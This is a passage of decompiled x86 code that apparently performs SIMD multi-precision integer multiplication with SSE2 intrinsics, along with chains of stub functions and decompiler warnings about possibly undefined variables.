  v138 = _mm_add_epi32(v132, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v134, v136), v136), 4));
  *(_DWORD *)(v139 + 48) = _mm_cvtsi128_si32(v137);
  v140 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v137), 0x10u), _mm_move_epi64(v138));
  v141 = _mm_unpackhi_epi64(v138, v135);
  *(_QWORD *)(v139 + 50) = v140.m128i_i64[0];
  v142 = _mm_add_epi32(_mm_unpackhi_epi64(v137, v135), _mm_srli_epi64(v140, 0x30u));
  v144 = _mm_load_si128(&v299);
  v145 = _mm_mul_epu32(_mm_load_si128(&v281), v144);
  v146 = _mm_mul_epu32(v144, v143[1]);
  v147 = _mm_load_si128(&stru_4BACE0);
  v148 = _mm_add_epi32(v142, _mm_and_si128(v147, v145));
  v149 = _mm_add_epi32(v141, _mm_srli_epi32(v145, 0x10u));
  v150 = _mm_and_si128(v147, v146);
  v151 = _mm_srli_epi32(v146, 0x10u);
  sub_449A9D();
  v152 = _mm_move_epi64(v150);
  v153 = _mm_move_epi64(v151);
  v154 = _mm_add_epi32(v148, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v150, v152), v152), 4));
  v155 = _mm_add_epi32(v149, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v151, v153), v153), 4));
  *(_DWORD *)(v156 + 56) = _mm_cvtsi128_si32(v154);
  v157 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v154), 0x10u), _mm_move_epi64(v155));
  v158 = _mm_unpackhi_epi64(v155, v152);
  *(_QWORD *)(v156 + 58) = v157.m128i_i64[0];
  v159 = _mm_add_epi32(_mm_unpackhi_epi64(v154, v152), _mm_srli_epi64(v157, 0x30u));
  v160 = _mm_load_si128(&v300);
  v161 = _mm_mul_epu32(_mm_load_si128(&v281), v160);
  v163 = _mm_mul_epu32(v160, *v162);
  v164 = _mm_load_si128(&stru_4BACE0);
  v165 = _mm_add_epi32(v159, _mm_and_si128(v164, v161));
  v166 = _mm_add_epi32(v158, _mm_srli_epi32(v161, 0x10u));
  v167 = _mm_and_si128(v164, v163);
  v168 = _mm_srli_epi32(v163, 0x10u);
  sub_449ADA();
  v169 = _mm_move_epi64(v167);
  v170 = _mm_move_epi64(v168);
  v171 = _mm_add_epi32(v165, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v167, v169), v169), 4));
  v172 = _mm_add_epi32(v166, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v168, v170), v170), 4));
  *(_DWORD *)(v173 + 64) = _mm_cvtsi128_si32(v171);
  v174 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v171), 0x10u), _mm_move_epi64(v172));
  v175 = _mm_unpackhi_epi64(v172, v169);
  *(_QWORD *)(v173 + 66) = v174.m128i_i64[0];
  v176 = _mm_add_epi32(_mm_unpackhi_epi64(v171, v169), _mm_srli_epi64(v174, 0x30u));
  v178 = _mm_load_si128(&v300);
  v179 = _mm_mul_epu32(_mm_load_si128(&v282), v178);
  v180 = _mm_mul_epu32(v178, v177[1]);
  v181 = _mm_load_si128(&stru_4BACE0);
  v182 = _mm_add_epi32(v176, _mm_and_si128(v181, v179));
  v183 = _mm_add_epi32(v175, _mm_srli_epi32(v179, 0x10u));
  v184 = _mm_and_si128(v181, v180);
  v185 = _mm_srli_epi32(v180, 0x10u);
  sub_449B17();
  v186 = _mm_move_epi64(v184);
  v187 = _mm_move_epi64(v185);
  v188 = _mm_add_epi32(v182, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v184, v186), v186), 4));
  v189 = _mm_add_epi32(v183, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v185, v187), v187), 4));
  *(_DWORD *)(v190 + 72) = _mm_cvtsi128_si32(v188);
  v191 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v188), 0x10u), _mm_move_epi64(v189));
  v192 = _mm_unpackhi_epi64(v189, v186);
  *(_QWORD *)(v190 + 74) = v191.m128i_i64[0];
  v193 = _mm_add_epi32(_mm_unpackhi_epi64(v188, v186), _mm_srli_epi64(v191, 0x30u));
  v194 = _mm_load_si128(&v301);
  v195 = _mm_mul_epu32(_mm_load_si128(&v282), v194);
  v197 = _mm_mul_epu32(v194, *v196);
  v198 = _mm_load_si128(&stru_4BACE0);
  v199 = _mm_add_epi32(v193, _mm_and_si128(v198, v195));
  v200 = _mm_add_epi32(v192, _mm_srli_epi32(v195, 0x10u));
  v201 = _mm_and_si128(v198, v197);
  v202 = _mm_srli_epi32(v197, 0x10u);
  sub_449B54();
  v203 = _mm_move_epi64(v201);
  v204 = _mm_move_epi64(v202);
  v205 = _mm_add_epi32(v199, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v201, v203), v203), 4));
  v206 = _mm_add_epi32(v200, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v202, v204), v204), 4));
  *(_DWORD *)(v207 + 80) = _mm_cvtsi128_si32(v205);
  v208 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v205), 0x10u), _mm_move_epi64(v206));
  v209 = _mm_unpackhi_epi64(v206, v203);
  *(_QWORD *)(v207 + 82) = v208.m128i_i64[0];
  v210 = _mm_add_epi32(_mm_unpackhi_epi64(v205, v203), _mm_srli_epi64(v208, 0x30u));
  v212 = _mm_load_si128(&v301);
  v213 = _mm_mul_epu32(_mm_load_si128(&v283), v212);
  v214 = _mm_mul_epu32(v212, v211[1]);
  v215 = _mm_load_si128(&stru_4BACE0);
  v216 = _mm_add_epi32(v210, _mm_and_si128(v215, v213));
  v217 = _mm_add_epi32(v209, _mm_srli_epi32(v213, 0x10u));
  v218 = _mm_and_si128(v215, v214);
  v219 = _mm_srli_epi32(v214, 0x10u);
  sub_449B91();
  v220 = _mm_move_epi64(v218);
  v221 = _mm_move_epi64(v219);
  v222 = _mm_add_epi32(v216, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v218, v220), v220), 4));
  v223 = _mm_add_epi32(v217, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v219, v221), v221), 4));
  *(_DWORD *)(v224 + 88) = _mm_cvtsi128_si32(v222);
  v225 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v222), 0x10u), _mm_move_epi64(v223));
  v226 = _mm_unpackhi_epi64(v223, v220);
  *(_QWORD *)(v224 + 90) = v225.m128i_i64[0];
  v227 = _mm_add_epi32(_mm_unpackhi_epi64(v222, v220), _mm_srli_epi64(v225, 0x30u));
  v228 = _mm_load_si128(&v302);
  v229 = _mm_mul_epu32(_mm_load_si128(&v283), v228);
  v231 = _mm_mul_epu32(v228, *v230);
  v232 = _mm_load_si128(&stru_4BACE0);
  v233 = _mm_add_epi32(v227, _mm_and_si128(v232, v229));
  v234 = _mm_add_epi32(v226, _mm_srli_epi32(v229, 0x10u));
  v235 = _mm_and_si128(v232, v231);
  v236 = _mm_srli_epi32(v231, 0x10u);
  sub_449BCE();
  v237 = _mm_move_epi64(v235);
  v238 = _mm_move_epi64(v236);
  v239 = _mm_add_epi32(v233, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v235, v237), v237), 4));
  v240 = _mm_add_epi32(v234, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v236, v238), v238), 4));
  *(_DWORD *)(v241 + 96) = _mm_cvtsi128_si32(v239);
  v242 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v239), 0x10u), _mm_move_epi64(v240));
  v243 = _mm_unpackhi_epi64(v240, v237);
  *(_QWORD *)(v241 + 98) = v242.m128i_i64[0];
  v244 = _mm_add_epi32(_mm_unpackhi_epi64(v239, v237), _mm_srli_epi64(v242, 0x30u));
  v246 = _mm_load_si128(&v302);
  v247 = _mm_mul_epu32(_mm_load_si128(&v284), v246);
  v248 = _mm_mul_epu32(v246, v245[1]);
  v249 = _mm_load_si128(&stru_4BACE0);
  v250 = _mm_add_epi32(v244, _mm_and_si128(v249, v247));
  v251 = _mm_add_epi32(v243, _mm_srli_epi32(v247, 0x10u));
  v252 = _mm_and_si128(v249, v248);
  v253 = _mm_srli_epi32(v248, 0x10u);
  sub_449C0B((int)&v284, &v302);
  v254 = _mm_move_epi64(v252);
  v255 = _mm_move_epi64(v253);
  v256 = _mm_add_epi32(v250, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v252, v254), v254), 4));
  v257 = _mm_add_epi32(v251, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v253, v255), v255), 4));
  *(_DWORD *)(v258 + 104) = _mm_cvtsi128_si32(v256);
  v259 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v256), 0x10u), _mm_move_epi64(v257));
  v260 = _mm_unpackhi_epi64(v257, v254);
  *(_QWORD *)(v258 + 106) = v259.m128i_i64[0];
  v261 = _mm_add_epi32(_mm_unpackhi_epi64(v256, v254), _mm_srli_epi64(v259, 0x30u));
  v262 = _mm_load_si128(&v303);
  v263 = _mm_mul_epu32(_mm_load_si128(&v284), v262);
  v265 = _mm_mul_epu32(v262, *v264);
  v266 = _mm_load_si128(&stru_4BACE0);
  v267 = _mm_and_si128(v266, v263);
  v268 = _mm_add_epi32(v260, _mm_srli_epi32(v263, 0x10u));
  v269 = _mm_and_si128(v266, v265);
  v270 = _mm_srli_epi32(v265, 0x10u);
  v271 = _mm_move_epi64(v269);
  v272 = _mm_move_epi64(v270);
  v273 = _mm_add_epi32(
           _mm_add_epi32(v261, v267),
           _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v269, v271), v271), 4));
  v274 = _mm_add_epi32(v268, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v270, v272), v272), 4));
  *(_DWORD *)(v258 + 112) = _mm_cvtsi128_si32(v273);
  v275 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v273), 0x10u), _mm_move_epi64(v274));
  *(_QWORD *)(v258 + 114) = v275.m128i_i64[0];
  *(_QWORD *)(v258 + 120) = _mm_add_epi64(
                              _mm_add_epi32(_mm_unpackhi_epi64(v273, v271), _mm_srli_epi64(v275, 0x30u)),
                              _mm_slli_epi64(_mm_unpackhi_epi64(v274, v271), 0x10u)).m128i_u64[0];
}
// 449CBD: variable 'v19' is possibly undefined
// 449CF3: variable 'v25' is possibly undefined
// 449D21: variable 'v33' is possibly undefined
// 449D90: variable 'v41' is possibly undefined
// 449DFC: variable 'v54' is possibly undefined
// 449E33: variable 'v60' is possibly undefined
// 449E8C: variable 'v71' is possibly undefined
// 449EB3: variable 'v75' is possibly undefined
// 449F1F: variable 'v88' is possibly undefined
// 449F56: variable 'v94' is possibly undefined
// 449FAF: variable 'v105' is possibly undefined
// 449FD6: variable 'v109' is possibly undefined
// 44A042: variable 'v122' is possibly undefined
// 44A079: variable 'v128' is possibly undefined
// 44A0D2: variable 'v139' is possibly undefined
// 44A0F9: variable 'v143' is possibly undefined
// 44A165: variable 'v156' is possibly undefined
// 44A19C: variable 'v162' is possibly undefined
// 44A1F5: variable 'v173' is possibly undefined
// 44A21C: variable 'v177' is possibly undefined
// 44A288: variable 'v190' is possibly undefined
// 44A2BF: variable 'v196' is possibly undefined
// 44A318: variable 'v207' is possibly undefined
// 44A33F: variable 'v211' is possibly undefined
// 44A3AB: variable 'v224' is possibly undefined
// 44A3E2: variable 'v230' is possibly undefined
// 44A43B: variable 'v241' is possibly undefined
// 44A462: variable 'v245' is possibly undefined
// 44A4CE: variable 'v258' is possibly undefined
// 44A503: variable 'v264' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;

//----- (004498B2) --------------------------------------------------------
int sub_4498B2()
{
  return sub_4498F2();
}
// 4498F2: using guessed type int sub_4498F2(void);

//----- (004498F2) --------------------------------------------------------
int sub_4498F2()
{
  return sub_44992F();
}
// 44992F: using guessed type int sub_44992F(void);

//----- (0044992F) --------------------------------------------------------
int sub_44992F()
{
  return sub_44996C();
}
// 44996C: using guessed type int sub_44996C(void);

//----- (0044996C) --------------------------------------------------------
int sub_44996C()
{
  return sub_4499A9();
}
// 4499A9: using guessed type int sub_4499A9(void);

//----- (004499A9) --------------------------------------------------------
int sub_4499A9()
{
  return sub_4499E6();
}
// 4499E6: using guessed type int sub_4499E6(void);

//----- (004499E6) --------------------------------------------------------
int sub_4499E6()
{
  return sub_449A23();
}
// 449A23: using guessed type int sub_449A23(void);

//----- (00449A23) --------------------------------------------------------
int sub_449A23()
{
  return sub_449A60();
}
// 449A60: using guessed type int sub_449A60(void);

//----- (00449A60) --------------------------------------------------------
int sub_449A60()
{
  return sub_449A9D();
}
// 449A9D: using guessed type int sub_449A9D(void);

//----- (00449A9D) --------------------------------------------------------
int sub_449A9D()
{
  return sub_449ADA();
}
// 449ADA: using guessed type int sub_449ADA(void);

//----- (00449ADA) --------------------------------------------------------
int sub_449ADA()
{
  return sub_449B17();
}
// 449B17: using guessed type int sub_449B17(void);

//----- (00449B17) --------------------------------------------------------
int sub_449B17()
{
  return sub_449B54();
}
// 449B54: using guessed type int sub_449B54(void);

//----- (00449B54) --------------------------------------------------------
int sub_449B54()
{
  return sub_449B91();
}
// 449B91: using guessed type int sub_449B91(void);

//----- (00449B91) --------------------------------------------------------
int sub_449B91()
{
  return sub_449BCE();
}
// 449BCE: using guessed type int sub_449BCE(void);

//----- (00449BCE) --------------------------------------------------------
int sub_449BCE()
{
  return sub_449C0B();
}
// 449C0B: using guessed type int sub_449C0B(void);

//----- (00449C0B) --------------------------------------------------------
__m128i __usercall sub_449C0B@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (0044A590) --------------------------------------------------------
void __cdecl sub_44A590(int a1, int a2, int a3)
{
  int i; // edx
  __m128i v4; // xmm0
  __m128i v5; // xmm1
  __m128i v6; // xmm2
  __m128i v7; // xmm7
  __m128i v8; // xmm0
  __m128i v9; // xmm7
  __m128i si128; // xmm6
  __m128i v11; // xmm4
  __m128i v12; // xmm5
  __m128i v13; // xmm6
  __m128i v14; // xmm7
  __m128i v15; // xmm0
  __m128i v16; // xmm1
  __m128i v17; // xmm4
  __m128i v18; // xmm5
  int v19; // ecx
  __m128i v20; // xmm6
  __m128i v21; // xmm5
  __m128i v22; // xmm4
  __m128i v23; // xmm7
  __m128i v24; // xmm0
  __m128i *v25; // edx
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm4
  __m128i v29; // xmm5
  __m128i v30; // xmm6
  __m128i v31; // xmm7
  unsigned int v32; // eax
  int v33; // ecx
  __m128i v34; // xmm0
  __m128i v35; // xmm1
  __m128i v36; // xmm4
  __m128i v37; // xmm5
  __m128i v38; // xmm6
  __m128i v39; // xmm5
  __m128i v40; // xmm4
  __m128i *v41; // edx
  __m128i v42; // xmm7
  __m128i v43; // xmm0
  __m128i v44; // xmm7
  __m128i v45; // xmm6
  __m128i v46; // xmm4
  __m128i v47; // xmm5
  __m128i v48; // xmm6
  __m128i v49; // xmm7
  __m128i v50; // xmm0
  __m128i v51; // xmm1
  __m128i v52; // xmm4
  __m128i v53; // xmm5
  int v54; // ecx
  __m128i v55; // xmm6
  __m128i v56; // xmm5
  __m128i v57; // xmm4
  __m128i v58; // xmm7
  __m128i v59; // xmm0
  __m128i *v60; // edx
  __m128i v61; // xmm7
  __m128i v62; // xmm6
  __m128i v63; // xmm2
  __m128i v64; // xmm5
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  __m128i v67; // xmm0
  __m128i v68; // xmm1
  __m128i v69; // xmm4
  __m128i v70; // xmm5
  __m128i v71; // xmm6
  _DWORD v72[13]; // [esp-4h] [ebp-E0h] BYREF
  __m128i v73; // [esp+30h] [ebp-ACh] BYREF
  __m128i v74; // [esp+40h] [ebp-9Ch] BYREF
  __m128i v75; // [esp+50h] [ebp-8Ch]
  __m128i v76; // [esp+60h] [ebp-7Ch]
  __m128i v77; // [esp+70h] [ebp-6Ch]
  __int128 v78; // [esp+90h] [ebp-4Ch]
  __m128i v79; // [esp+A0h] [ebp-3Ch] BYREF
  __m128i v80; // [esp+B0h] [ebp-2Ch] BYREF
  __m128i v81; // [esp+C0h] [ebp-1Ch] BYREF
  int v82; // [esp+D0h] [ebp-Ch] BYREF

  v72[0] = &v82;
  for ( i = 0; i != 16; i += 8 )
  {
    v4 = _mm_shuffle_epi32(*(__m128i *)(a2 + i * 2), 216);
    v5 = _mm_shuffle_epi32(*(__m128i *)(a2 + i * 2), 141);
    v6 = _mm_shuffle_epi32(*(__m128i *)(a3 + i * 2), 216);
    *(__m128i *)&v72[i + 5] = v4;
    *(__m128i *)&v72[i + 9] = _mm_srli_epi64(v4, 0x20u);
    *(__m128i *)((char *)&v75 + 1 * i) = v5;
    *(__m128i *)((char *)&v76 + 1 * i) = _mm_srli_epi64(v5, 0x20u);
    *(__int128 *)((char *)&v78 + 1 * i) = (__int128)v6;
    *(__m128i *)((char *)&v79 + 1 * i) = _mm_srli_epi64(v6, 0x20u);
  }
  v7 = _mm_load_si128(&v79);
  v8 = _mm_mul_epu32(_mm_load_si128(&v73), v7);
  v9 = _mm_mul_epu32(v7, v77);
  si128 = _mm_load_si128(&stru_4BACE0);
  v11 = _mm_add_epi32((__m128i)0i64, _mm_and_si128(si128, v8));
  v12 = _mm_add_epi32(
          _mm_slli_epi64(
            _mm_add_epi32(
              _mm_add_epi32(
                _mm_add_epi32(
                  (__m128i)0i64,
                  _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v72[39]), v77), 0x30u)),
                _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v80.m128i_i8[8]), v75), 0x30u)),
              _mm_srli_epi64(_mm_mul_epu32(_mm_loadl_epi64((const __m128i *)&v79.m128i_i8[8]), v76), 0x30u)),
            0x20u),
          _mm_srli_epi32(v8, 0x10u));
  v13 = _mm_and_si128(si128, v9);
  v14 = _mm_srli_epi32(v9, 0x10u);
  sub_44A65F();
  v15 = _mm_move_epi64(v13);
  v16 = _mm_move_epi64(v14);
  v17 = _mm_add_epi32(v11, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v13, v15), v15), 4));
  v18 = _mm_add_epi32(v12, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v14, v16), v16), 4));
  *(_DWORD *)v19 = _mm_cvtsi128_si32(v17);
  v20 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v17), 0x10u), _mm_move_epi64(v18));
  v21 = _mm_unpackhi_epi64(v18, v15);
  *(_QWORD *)(v19 + 2) = v20.m128i_i64[0];
  v22 = _mm_add_epi32(_mm_unpackhi_epi64(v17, v15), _mm_srli_epi64(v20, 0x30u));
  v23 = _mm_load_si128(&v80);
  v24 = _mm_mul_epu32(_mm_load_si128(&v73), v23);
  v26 = _mm_mul_epu32(v23, *v25);
  v27 = _mm_load_si128(&stru_4BACE0);
  v28 = _mm_add_epi32(v22, _mm_and_si128(v27, v24));
  v29 = _mm_add_epi32(v21, _mm_srli_epi32(v24, 0x10u));
  v30 = _mm_and_si128(v27, v26);
  v31 = _mm_srli_epi32(v26, 0x10u);
  v32 = sub_44A69C();
  v34 = _mm_move_epi64(v30);
  v35 = _mm_move_epi64(v31);
  v36 = _mm_add_epi32(
          _mm_add_epi32(
            v28,
            _mm_srli_epi32(
              _mm_cmpgt_epi32(
                _mm_srli_epi32(_mm_cvtsi32_si128(*(_DWORD *)(v33 + 4)), 0x10u),
                _mm_cvtsi32_si128(HIWORD(v32))),
              0x1Fu)),
          _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v30, v34), v34), 4));
  v37 = _mm_add_epi32(v29, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v31, v35), v35), 4));
  *(_DWORD *)v33 = _mm_cvtsi128_si32(v36);
  v38 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v36), 0x10u), _mm_move_epi64(v37));
  v39 = _mm_unpackhi_epi64(v37, v34);
  *(_QWORD *)(v33 + 2) = v38.m128i_i64[0];
  v40 = _mm_add_epi32(_mm_unpackhi_epi64(v36, v34), _mm_srli_epi64(v38, 0x30u));
  v42 = _mm_load_si128(&v80);
  v43 = _mm_mul_epu32(_mm_load_si128(&v74), v42);
  v44 = _mm_mul_epu32(v42, v41[1]);
  v45 = _mm_load_si128(&stru_4BACE0);
  v46 = _mm_add_epi32(v40, _mm_and_si128(v45, v43));
  v47 = _mm_add_epi32(v39, _mm_srli_epi32(v43, 0x10u));
  v48 = _mm_and_si128(v45, v44);
  v49 = _mm_srli_epi32(v44, 0x10u);
  sub_44A6D9((int)&v74, &v80);
  v50 = _mm_move_epi64(v48);
  v51 = _mm_move_epi64(v49);
  v52 = _mm_add_epi32(v46, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v48, v50), v50), 4));
  v53 = _mm_add_epi32(v47, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v49, v51), v51), 4));
  *(_DWORD *)(v54 + 8) = _mm_cvtsi128_si32(v52);
  v55 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v52), 0x10u), _mm_move_epi64(v53));
  v56 = _mm_unpackhi_epi64(v53, v50);
  *(_QWORD *)(v54 + 10) = v55.m128i_i64[0];
  v57 = _mm_add_epi32(_mm_unpackhi_epi64(v52, v50), _mm_srli_epi64(v55, 0x30u));
  v58 = _mm_load_si128(&v81);
  v59 = _mm_mul_epu32(_mm_load_si128(&v74), v58);
  v61 = _mm_mul_epu32(v58, *v60);
  v62 = _mm_load_si128(&stru_4BACE0);
  v63 = _mm_and_si128(v62, v59);
  v64 = _mm_add_epi32(v56, _mm_srli_epi32(v59, 0x10u));
  v65 = _mm_and_si128(v62, v61);
  v66 = _mm_srli_epi32(v61, 0x10u);
  v67 = _mm_move_epi64(v65);
  v68 = _mm_move_epi64(v66);
  v69 = _mm_add_epi32(_mm_add_epi32(v57, v63), _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v65, v67), v67), 4));
  v70 = _mm_add_epi32(v64, _mm_slli_si128(_mm_add_epi32(_mm_unpackhi_epi64(v66, v68), v68), 4));
  *(_DWORD *)(v54 + 16) = _mm_cvtsi128_si32(v69);
  v71 = _mm_add_epi64(_mm_srli_epi64(_mm_move_epi64(v69), 0x10u), _mm_move_epi64(v70));
  *(_QWORD *)(v54 + 18) = v71.m128i_i64[0];
  *(_QWORD *)(v54 + 24) = _mm_add_epi64(
                            _mm_add_epi32(_mm_unpackhi_epi64(v69, v67), _mm_srli_epi64(v71, 0x30u)),
                            _mm_slli_epi64(_mm_unpackhi_epi64(v70, v67), 0x10u)).m128i_u64[0];
}
// 44A78B: variable 'v19' is possibly undefined
// 44A7C1: variable 'v25' is possibly undefined
// 44A7EF: variable 'v33' is possibly undefined
// 44A85E: variable 'v41' is possibly undefined
// 44A8CA: variable 'v54' is possibly undefined
// 44A8FF: variable 'v60' is possibly undefined
// 4BACE0: using guessed type __m128i stru_4BACE0;

//----- (0044A65F) --------------------------------------------------------
int sub_44A65F()
{
  return sub_44A69C();
}
// 44A69C: using guessed type int sub_44A69C(void);

//----- (0044A69C) --------------------------------------------------------
int sub_44A69C()
{
  return sub_44A6D9();
}
// 44A6D9: using guessed type int sub_44A6D9(void);

//----- (0044A6D9) --------------------------------------------------------
__m128i __usercall sub_44A6D9@<xmm0>(int a1@<edi>, const __m128i *a2@<esi>)
{
  return _mm_srli_epi32(_mm_mul_epu32(_mm_load_si128((const __m128i *)(a1 - 16)), _mm_load_si128(a2 + 1)), 0x10u);
}

//----- (0044A990) --------------------------------------------------------
int __cdecl sub_44A990(int a1, int a2)
{
  unsigned int i; // edx
  __m128i v3; // xmm0
  __m128i v4; // xmm1
  __m128i v5; // xmm7
  __m128i v6; // xmm5
  __m128i si128; // xmm6
  __m128i v8; // xmm4
  __m128i v9; // xmm7
  __m128i v10; // xmm6
  __m128i v11; // xmm7
  __m128i v12; // xmm0
  __m128i v13; // xmm1
  __m128 v14; // xmm6
  __m128 v15; // xmm4
  __m128i v16; // xmm6
  __m128 v17; // xmm5
  __m128i v18; // xmm4
  __m128i v19; // xmm7
  __m128i v20; // xmm5
  __m128i v21; // xmm6
  __m128i v22; // xmm4
  __m128i v23; // xmm5
  __m128i v24; // xmm7
  __m128i v25; // xmm6
  __m128i v26; // xmm7
  __m128i v27; // xmm6
  __m128i v28; // xmm7
  __m128i v29; // xmm5
  __m128i v30; // xmm0
  __m128i v31; // xmm1
  __m128 v32; // xmm6
  __m128 v33; // xmm4
  __m128i v34; // xmm6
  __m128 v35; // xmm5
  __m128i v36; // xmm4
  __m128i v37; // xmm7
  __m128i v38; // xmm5
  __m128i v39; // xmm6
  __m128i v40; // xmm4
  __m128i v41; // xmm5
  __m128i v42; // xmm7
  __m128i v43; // xmm3
  __m128i v44; // xmm1
  __m128i v45; // xmm3
  __m128i v46; // xmm2
  __m128i v47; // xmm6
  __m128i v48; // xmm7
  __m128i v49; // xmm6
  __m128i v50; // xmm7
  __m128i v51; // xmm5
  __m128i v52; // xmm0
  __m128i v53; // xmm1
  __m128 v54; // xmm6
  __m128 v55; // xmm4
  __m128i v56; // xmm6
  __m128 v57; // xmm5
  __m128i v58; // xmm4
  __m128i v59; // xmm7
  __m128i v60; // xmm5
  __m128i v61; // xmm6
  __m128i v62; // xmm4
  __m128i v63; // xmm5
  __m128i v64; // xmm7
  __m128i v65; // xmm6
  __m128i v66; // xmm7
  __m128i v67; // xmm6
  __m128i v68; // xmm7
  __m128i v69; // xmm5
  __m128i v70; // xmm0
  __m128i v71; // xmm1
  __m128 v72; // xmm6
  __m128 v73; // xmm4
  __m128i v74; // xmm6
  int v75; // ecx
  __m128 v76; // xmm5
  __m128i v77; // xmm4
  __m128i v78; // xmm7
  __m128i v79; // xmm5
  __m128i v80; // xmm6
  __m128i v81; // xmm4
  __m128i v82; // xmm5
  int v83; // edx
  __m128i v84; // xmm7
  __m128i v85; // xmm3
  __m128i v86; // xmm1
  __m128i v87; // xmm3
  __m128i v88; // xmm2
  __m128i v89; // xmm6
  __m128i v90; // xmm7
  __m128i v91; // xmm6
  __m128i v92; // xmm7
  __m128i v93; // xmm5
  __m128i v94; // xmm0
  __m128i v95; // xmm1
  __m128 v96; // xmm6
  __m128 v97; // xmm4
  __m128i v98; // xmm6
  int v99; // ecx
  __m128 v100; // xmm5
  __m128i v101; // xmm4
  __m128i v102; // xmm7
  __m128i v103; // xmm5
  __m128i v104; // xmm6
  __m128i v105; // xmm4
  __m128i v106; // xmm5
  __m128i *v107; // edx
  __m128i v108; // xmm7
  __m128i v109; // xmm6
  __m128i v110; // xmm7
  __m128i v111; // xmm6
  __m128i v112; // xmm7
  __m128i v113; // xmm5
  __m128i v114; // xmm0
  __m128i v115; // xmm1
  __m128 v116; // xmm6
  __m128 v117; // xmm4
  __m128i v118; // xmm6
  int v119; // ecx
  __m128 v120; // xmm5
  __m128i v121; // xmm4
  __m128i v122; // xmm7
  __m128i v123; // xmm5
  __m128i v124; // xmm6
  __m128i v125; // xmm4
  __m128i v126; // xmm5
  int v127; // edx
  __m128i v128; // xmm7
  __m128i v129; // xmm3
  __m128i v130; // xmm1
  __m128i v131; // xmm3
  __m128i v132; // xmm2
  __m128i v133; // xmm6
  __m128i v134; // xmm7
  __m128i v135; // xmm6
  __m128i v136; // xmm7
  __m128i v137; // xmm5
  __m128i v138; // xmm0
  __m128i v139; // xmm1
  __m128 v140; // xmm6
  __m128 v141; // xmm4
  __m128i v142; // xmm6
  int v143; // ecx
  __m128 v144; // xmm5
  __m128i v145; // xmm4
  __m128i v146; // xmm7
  __m128i v147; // xmm5
  __m128i v148; // xmm6
  __m128i v149; // xmm4
  __m128i v150; // xmm5
  __m128i *v151; // edx
  __m128i v152; // xmm7
  __m128i v153; // xmm6
  __m128i v154; // xmm7
  __m128i v155; // xmm6
  __m128i v156; // xmm7
  __m128i v157; // xmm5
  __m128i v158; // xmm0
  __m128i v159; // xmm1
  __m128 v160; // xmm6
  __m128 v161; // xmm4
  __m128i v162; // xmm6
  int v163; // ecx
  __m128 v164; // xmm5
  __m128i v165; // xmm4
  __m128i v166; // xmm7
  __m128i v167; // xmm5
  __m128i v168; // xmm6
  __m128i v169; // xmm4
  __m128i v170; // xmm5
  int v171; // edx
  __m128i v172; // xmm7
  __m128i v173; // xmm3
  __m128i v174; // xmm1
  __m128i v175; // xmm3
  __m128i v176; // xmm2
  __m128i v177; // xmm6
  __m128i v178; // xmm7
  __m128i v179; // xmm6
  __m128i v180; // xmm7
  __m128i v181; // xmm5
  __m128i v182; // xmm0
  __m128i v183; // xmm1
  __m128 v184; // xmm6
  __m128 v185; // xmm4
  __m128i v186; // xmm6
  int v187; // ecx
  __m128 v188; // xmm5
  __m128i v189; // xmm4
  __m128i v190; // xmm7
  __m128i v191; // xmm5
  __m128i v192; // xmm6
  __m128i v193; // xmm4
  __m128i v194; // xmm5
  __m128i *v195; // edx
  __m128i v196; // xmm7
  __m128i v197; // xmm6
  __m128i v198; // xmm7
  __m128i v199; // xmm6
  __m128i v200; // xmm7
  __m128i v201; // xmm5
  __m128i v202; // xmm0
  __m128i v203; // xmm1
  __m128 v204; // xmm6
  __m128 v205; // xmm4
  __m128i v206; // xmm6
  int v207; // ecx
  __m128 v208; // xmm5
  __m128i v209; // xmm4
  __m128i v210; // xmm7
  __m128i v211; // xmm5
  __m128i v212; // xmm6
  __m128i v213; // xmm4
  __m128i v214; // xmm5
